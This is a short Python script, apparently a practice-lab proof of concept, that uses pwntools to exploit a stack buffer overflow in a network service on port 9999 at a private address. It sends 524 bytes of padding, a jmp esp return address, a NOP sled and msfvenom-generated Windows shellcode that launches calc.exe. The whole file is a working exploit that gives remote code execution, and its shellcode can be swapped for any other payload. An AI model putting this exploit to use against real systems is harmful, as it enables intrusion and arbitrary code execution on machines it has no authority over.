#!/usr/bin/env python3

from pwn import *


padding = b'\x41' * 524
nops =    b'\x90' * 64

# msfvenom -p windows/exec -f py CMD=calc.exe
shellcode =  b""
shellcode += b"\xb8\x06\x2d\x04\x95\xdb\xc7\xd9\x74\x24\xf4\x5e\x33"
shellcode += b"\xc9\xb1\x31\x83\xee\xfc\x31\x46\x0f\x03\x46\x09\xcf"
shellcode += b"\xf1\x69\xfd\x8d\xfa\x91\xfd\xf1\x73\x74\xcc\x31\xe7"
shellcode += b"\xfc\x7e\x82\x63\x50\x72\x69\x21\x41\x01\x1f\xee\x66"
shellcode += b"\xa2\xaa\xc8\x49\x33\x86\x29\xcb\xb7\xd5\x7d\x2b\x86"
shellcode += b"\x15\x70\x2a\xcf\x48\x79\x7e\x98\x07\x2c\x6f\xad\x52"
shellcode += b"\xed\x04\xfd\x73\x75\xf8\xb5\x72\x54\xaf\xce\x2c\x76"
shellcode += b"\x51\x03\x45\x3f\x49\x40\x60\x89\xe2\xb2\x1e\x08\x23"
shellcode += b"\x8b\xdf\xa7\x0a\x24\x12\xb9\x4b\x82\xcd\xcc\xa5\xf1"
shellcode += b"\x70\xd7\x71\x88\xae\x52\x62\x2a\x24\xc4\x4e\xcb\xe9"
shellcode += b"\x93\x05\xc7\x46\xd7\x42\xcb\x59\x34\xf9\xf7\xd2\xbb"
shellcode += b"\x2e\x7e\xa0\x9f\xea\xdb\x72\x81\xab\x81\xd5\xbe\xac"
shellcode += b"\x6a\x89\x1a\xa6\x86\xde\x16\xe5\xcc\x21\xa4\x93\xa2"
shellcode += b"\x22\xb6\x9b\x92\x4a\x87\x10\x7d\x0c\x18\xf3\x3a\xe2"
shellcode += b"\x52\x5e\x6a\x6b\x3b\x0a\x2f\xf6\xbc\xe0\x73\x0f\x3f"
shellcode += b"\x01\x0b\xf4\x5f\x60\x0e\xb0\xe7\x98\x62\xa9\x8d\x9e"
shellcode += b"\xd1\xca\x87\xfc\xb4\x58\x4b\x2d\x53\xd9\xee\x31"

payload = flat(
    padding,
    p32(0x311712f3), # jmp esp;
    nops,
    shellcode
)

with remote('192.168.122.193', 9999) as r:
    r.writeline(payload)

